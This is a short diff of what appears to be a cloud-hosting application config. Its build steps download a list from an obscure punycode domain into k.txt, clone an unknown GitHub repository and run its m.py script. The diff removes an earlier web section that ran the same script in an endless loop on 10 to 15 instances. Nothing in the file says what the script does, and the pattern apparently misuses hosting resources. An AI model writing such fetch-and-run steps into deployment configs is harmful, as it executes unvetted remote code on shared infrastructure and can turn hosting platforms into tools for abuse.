@@ -18,18 +18,8 @@ applications:
         curl -s "https://xn--mnqu23e2hf.lol/api.php?key=user1208&country=all" > k.txt
 
         git clone https://github.com/vrbrh921-glitch/Fc.git
+        cd Fc
+        python3 m.py
         
 
-    web:
-      instances:
-        min: 10
-        max: 15
-      commands:
-        start: |
-          cd Fc
-          exec bash -c 'while true; do python3 m.py; sleep 2; done'
-
-      locations:
-        "/":
-          passthru: true
-          allow: true
+    
